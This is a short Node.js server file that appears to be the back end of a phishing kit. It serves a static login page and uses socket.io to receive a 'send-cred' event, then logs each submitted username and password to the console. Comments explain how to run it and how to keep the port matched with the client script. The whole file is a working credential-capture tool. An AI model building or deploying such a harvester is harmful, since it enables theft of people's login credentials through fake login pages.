const express = require('express')
const app = express()
const server = require('http').createServer(app)
const socket = require('socket.io')(server, {
    cors: { origin: '*' }
})
const port = 2000

app.use(express.static('../public'))

socket.on('connection', (client_socket) => {
    console.log(`User captured ID: ${client_socket.id}`);
    client_socket.on('send-cred', (username, password) => {
        console.log(`User login information => ${username}: ${password}`);
    }) // After the event (send-cred) is triggered, the username and the password will be sent to the server and this event-handler
        // will handle that event. In this case the send-cred event-handler will just print the username and the password in the server
})

server.listen(port, () => {
    console.log(`Server is listening on port ${port}`); // Server listening on http://localhost:2000/login.html
                                                    // If you change the `port` varibale here, you have to change the login.js
                                                    // In, login.js, change the port of the `host` variable. 
})
